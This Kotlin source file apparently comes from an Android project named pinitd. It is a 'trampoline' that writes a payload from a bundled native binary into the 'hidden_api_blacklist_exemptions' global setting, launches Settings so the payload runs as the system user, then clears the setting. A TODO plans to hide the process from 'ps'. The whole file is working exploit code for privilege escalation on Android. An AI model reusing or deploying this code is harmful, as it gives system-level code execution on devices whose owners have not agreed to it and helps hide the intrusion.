package im.agg.pinitd

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.provider.Settings
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import java.io.BufferedReader
import java.io.InputStreamReader
import kotlin.time.Duration.Companion.seconds

const val TAG = "pinitd-trampoline"
val EXEMPTIONS_SETTING_URI: Uri = Settings.Global.getUriFor("hidden_api_blacklist_exemptions")

suspend fun launchPinitd(scope: CoroutineScope, context: Context) {
    // Path will end with "base.apk". Remove that and navigate to native library
    val basePath = context.packageCodePath.slice(0..context.packageCodePath.length-9)
    val binaryPath = basePath + "lib/arm64/libpinitd.so"
    Log.w(TAG, "Attempting to launch: $binaryPath")
    try {
        // Spawn logcat monitor
        val logcat = Logcat(scope)
        // Make sure logcat is as up to date as possible when we start waiting on it
        logcat.eatInBackground()
        // This spawning process appears to write an extra byte to Zygote's control socket
        // However, this only seems to cause Zygote to think we have the wrong pid. I am unsure
        // if this has any negative ramifications
        val process = Runtime.getRuntime().exec(arrayOf(binaryPath, "build-payload"))

        val reader = BufferedReader(InputStreamReader(process.inputStream))
        var payload = reader.readText()
        reader.close()

        // Fetch settings launch intent prior to actually setting the exploit to improve timing
        val settingsIntent = context.packageManager.getLaunchIntentForPackage("com.android.settings")
        settingsIntent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)

        Log.w(TAG, "Setting payload: $payload")
        Settings.Global.putString(context.contentResolver, "hidden_api_blacklist_exemptions", payload)

        // TODO: Add retries
        Log.w(TAG, "Payload set")
        startApp("Settings", context, settingsIntent)

        logcat.waitForSubstring("com.android.settings/1000 for top-activity {com.android.settings/com.android.settings.Settings", 1.seconds)
        Log.w(TAG, "Received settings launch log. Sending exemptions clear")

        // TODO: Add success/failure check
        context.contentResolver.delete(EXEMPTIONS_SETTING_URI, null, null)

        Log.w(TAG, "Trampoline complete")

        // TODO: Kill process after delay (to keep `ps` clean)
    } catch (e: Exception) {
        Log.e(TAG, "Exploit error: ${e.message}")
    }
}

fun startApp(name: String, context: Context, intent: Intent?) {
    try {
        if (intent != null) {
            Log.w(TAG, "Starting $name")
            context.startActivity(intent)
            Log.w(TAG, "Intent sent for $name")
        } else {
            Log.e(TAG, "App not found")
        }
    } catch (e: Exception) {
        Log.e(TAG, "App launch error: ${e.message}")
    }
}